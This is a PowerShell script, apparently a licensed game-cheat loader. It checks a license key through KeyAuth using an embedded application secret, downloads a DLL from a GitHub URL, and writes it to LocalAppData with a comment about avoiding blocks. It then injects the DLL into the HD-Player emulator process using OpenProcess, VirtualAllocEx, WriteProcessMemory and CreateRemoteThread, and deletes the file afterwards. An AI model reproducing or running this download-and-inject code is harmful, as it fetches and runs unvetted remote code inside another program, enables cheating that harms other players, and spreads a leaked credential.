# ==========================================
# BASX PROJECT - STABLE VERSION
# ==========================================
$Name = "Stampkung67's Application"
$OwnerID = "zqPIRmTbyT"
$Secret = "6ed28df5cd7ab51b219bc02ac48bea45efacb554a69dfdba02085c262f9918ed"
$Version = "1.0"

function Show-Auth {
    Clear-Host
    Write-Host "==============================" -ForegroundColor Cyan
    Write-Host "    BASX DLL Power-Shell v$Version" -ForegroundColor Cyan
    Write-Host "==============================" -ForegroundColor Cyan
    
    $initUrl = "https://keyauth.win/api/1.2/?type=init&name=$Name&ownerid=$OwnerID&secret=$Secret&version=$Version"
    try {
        $initRes = Invoke-RestMethod -Uri $initUrl -Method Get
        if ($initRes.success -ne $true) {
            Write-Host "[-] Init Failed: $($initRes.message)" -ForegroundColor Red
            return $false
        }
        $sessionId = $initRes.sessionid
    } catch {
        Write-Host "[!] Cannot connect to Auth Server." -ForegroundColor Red
        return $false
    }

    $key = Read-Host " Enter License Key"
    $hwid = (Get-CimInstance Win32_ComputerSystemProduct).UUID
    $loginUrl = "https://keyauth.win/api/1.2/?type=license&key=$key&hwid=$hwid&sessionid=$sessionId&name=$Name&ownerid=$OwnerID"
    
    try {
        $loginRes = Invoke-RestMethod -Uri $loginUrl -Method Get
        if ($loginRes.success -eq $true) {
            Write-Host "[+] Login Success! Welcome." -ForegroundColor Green
            return $true
        } else {
            Write-Host "[-] Error: $($loginRes.message)" -ForegroundColor Red
            return $false
        }
    } catch {
        Write-Host "[!] Auth Error." -ForegroundColor Red
        return $false
    }
}

if (Show-Auth) {
    # ปรับปรุง Path และการเชื่อมต่อ
    $dllUrl = "https://raw.githubusercontent.com/relaxhaha56-maker/node-storage-33/refs/heads/main/RELAx%20DLL.dll"
    $tempPath = "$env:LOCALAPPDATA\temp_v8_node.dll" # เปลี่ยนมาใช้ LocalAppData เพื่อเลี่ยงการโดนบล็อกบางส่วน
    $targetProc = "HD-Player"

    Write-Host "[*] Checking target process..." -ForegroundColor Yellow
    $process = Get-Process -Name $targetProc -ErrorAction SilentlyContinue
    if (!$process) {
        Write-Host "[!] Error: $targetProc is not running!" -ForegroundColor Red
        Pause
        exit
    }

    Write-Host "[*] Downloading DLL..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $dllUrl -OutFile $tempPath

    $Source = @"
    using System;
    using System.Runtime.InteropServices;
    using System.Diagnostics;
    using System.Text;
    public class NodeHandler {
        [DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto)] public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)] static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll", SetLastError = true)] static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")] static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        public static void StartNode(string path, string pName) {
            Process[] target = Process.GetProcessesByName(pName);
            if (target.Length == 0) return;
            
            // 0x1F0FFF คือ All Access
            IntPtr hProc = OpenProcess(0x1F0FFF, false, target[0].Id);
            if (hProc == IntPtr.Zero) return;

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
            uint size = (uint)((path.Length + 1) * Marshal.SizeOf(typeof(char)));
            IntPtr addr = VirtualAllocEx(hProc, IntPtr.Zero, size, 0x3000, 0x40);
            
            IntPtr outSize;
            byte[] pathBytes = Encoding.Default.GetBytes(path);
            WriteProcessMemory(hProc, addr, pathBytes, (uint)pathBytes.Length, out outSize);
            
            CreateRemoteThread(hProc, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
"@
    Add-Type -TypeDefinition $Source
    
    Write-Host "[*] Injecting into $targetProc..." -ForegroundColor Yellow
    [NodeHandler]::StartNode($tempPath, $targetProc)
    
    # --- จุดสำคัญ: อย่าเพิ่งลบไฟล์ทันที ---
    Write-Host "[+] Injection Sent. Waiting for process to hook..." -ForegroundColor Green
    Start-Sleep -Seconds 5 
    
    # พยายามลบไฟล์ ถ้าลบไม่ได้แสดงว่าเกมยังดึงไฟล์ไว้อยู่ (ซึ่งดี)
    Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
    Write-Host "[!] Ready! Press F8 in game." -ForegroundColor Cyan
} else {
    Start-Sleep -Seconds 3
}
